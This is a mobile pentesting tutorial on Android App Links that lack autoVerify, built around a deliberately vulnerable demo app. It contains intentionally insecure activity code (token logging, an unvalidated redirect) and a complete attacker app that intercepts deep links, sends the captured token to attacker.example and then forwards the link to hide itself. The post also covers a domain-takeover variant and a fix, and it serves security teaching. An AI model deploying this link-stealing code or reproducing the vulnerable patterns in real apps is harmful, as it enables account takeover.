---
title: Android - App Link autoVerify=false
author: nirajkharel
date: 2026-06-22 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, App Links, Deep Links]
render_with_liquid: false
---


Android App Links let apps claim ownership of HTTPS domains so that links to those domains open directly in the app instead of showing a browser or a chooser. The claim becomes authoritative when the framework verifies it via `android:autoVerify="true"` against a valid `assetlinks.json` on the domain. Without `autoVerify`, the filter is advisory - any other installed app can declare the same scheme and host and become a competing handler. The user sees an "Open with" chooser and may pick the attacker's app.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/activities/DeepLinkActivity.java</code></li>
    <li><code>android/app/src/main/AndroidManifest.xml</code> (<code>DeepLinkActivity</code> intent-filter, <code>autoVerify</code> omitted)</li>
  </ul>
</aside>

<br>**Where is the missing attribute?**

```bash
grep -B 2 -A 10 'intent-filter' AndroidManifest.xml | grep -E 'autoVerify|scheme|host'
```

VulnLabApp's manifest declares:

```xml
<activity android:name=".activities.DeepLinkActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <!-- autoVerify intentionally omitted -->
        <data android:scheme="https"
            android:host="app.vulnlabapp.example.com"
            android:pathPrefix="/open" />
    </intent-filter>
</activity>
```

No `autoVerify="true"`. The framework does not verify ownership against `https://app.vulnlabapp.example.com/.well-known/assetlinks.json`. Any app can register the same filter and compete.

<br>**What does the activity do with the URI?**

```java
// DeepLinkActivity.java
Uri data = intent.getData();

// VULN: token from URI query param — also logged (logcat leakage)
String token    = data.getQueryParameter("token");
String redirect = data.getQueryParameter("redirect");
String action   = data.getQueryParameter("action");

Log.d(TAG, "[deep-link] token=" + token + " redirect=" + redirect + " action=" + action);

// VULN: open redirect — redirect URL not validated
if (redirect != null) {
    Intent webIntent = new Intent(this, WebViewActivity.class);
    webIntent.putExtra("url", redirect);   // any URL including javascript:
    startActivity(webIntent);
}
```

Token, redirect URL, and action all flow from the deep link URI with no validation. The token is logged in plaintext. The redirect URL is passed directly to `WebViewActivity` - which was the file-scheme arbitrary-read and cookie-manager cross-origin blog target.

Confirm with ADB:

```bash
adb shell am start -a android.intent.action.VIEW \
  -d 'https://app.vulnlabapp.example.com/open?token=abc123&redirect=https://attacker.example/'
```

```bash
adb logcat -s VulnDeepLink
# [deep-link] token=abc123 redirect=https://attacker.example/ action=null
```

<br>**What does the attacker app do?**

The attacker registers the same intent-filter and intercepts the URI:

```xml
<activity android:name=".LinkStealer" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="https"
            android:host="app.vulnlabapp.example.com"
            android:pathPrefix="/open" />
    </intent-filter>
</activity>
```

```java
public class LinkStealer extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri data = getIntent().getData();
        if (data != null) {
            // Exfiltrate the full URL including token, OAuth code, reset nonce
            new Thread(() -> {
                try {
                    new OkHttpClient().newCall(new Request.Builder()
                        .url("https://attacker.example/?stolen=" +
                             URLEncoder.encode(data.toString(), "UTF-8"))
                        .build()).execute();
                } catch (IOException ignored) {}
            }).start();

            // Forward to the real app so the user sees expected behaviour
            Intent forward = new Intent(Intent.ACTION_VIEW, data);
            forward.setPackage("com.vulnlab.app");
            forward.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(forward);
        }
        finish();
    }
}
```

The user taps a magic-link email: `https://app.vulnlabapp.example.com/open?token=abc123def456`. The chooser appears with both apps listed. The user picks the attacker (named something plausible). The attacker reads the token, exfiltrates it, then forwards the original URI to the real app. The user sees the expected login screen and does not notice an intermediary.

If the user previously tapped "Always" for the attacker app, no chooser appears on future links.

<br>**What does the assetlinks.json verification look like?**

For apps that set `autoVerify="true"`, confirm the domain verification file is correct:

```bash
curl https://app.vulnlabapp.example.com/.well-known/assetlinks.json
```

What does a valid file look like?

```json
[{
  "relation": ["delegate_permission/common.handle_all_urls"],
  "target": {
    "namespace": "android_app",
    "package_name": "com.vulnlab.app",
    "sha256_cert_fingerprints": ["AB:CD:EF:..."]
  }
}]
```

Common failure modes that silently degrade `autoVerify` to competitive mode:

- File missing entirely
- Wrong SHA-256 hash (dev cert vs production cert)
- File behind an HTTP redirect (the verifier does not follow redirects)
- HTTPS error on the `/.well-known/` path

Each failure causes the framework to treat the filter as if `autoVerify` were absent.

<br>**What does the domain takeover variant look like?**

If the developer pointed their app at a domain that later lapsed:

1. App's `assetlinks.json` was hosted at the expired domain.
2. Attacker registers the expired domain.
3. Attacker hosts a new `assetlinks.json` pointing at their own signing cert.
4. On next framework re-verification (app update or periodic check), the attacker's app gets exclusive domain ownership.

Result: attacker's app silently intercepts all deep links to that domain, no chooser. Check WHOIS on every domain declared in app link filters.

<br>**What is the fix?**

Add `autoVerify="true"` to every intent-filter with an HTTPS scheme:

```xml
<intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="https"
        android:host="app.vulnlabapp.example.com"
        android:pathPrefix="/open" />
</intent-filter>
```

Then host a valid `assetlinks.json` at `https://app.vulnlabapp.example.com/.well-known/assetlinks.json` with the production signing cert's SHA-256 fingerprint.

<br>**Closing**

`autoVerify="true"` is the one attribute that separates "this app handles these links" from "this app exclusively handles these links". Without it, any installed app with the same filter competes. The audit is one manifest grep. The impact scales with what the deep links carry - magic-link tokens, OAuth codes, and password-reset nonces are account takeover primitives.

Happy Hacking !!
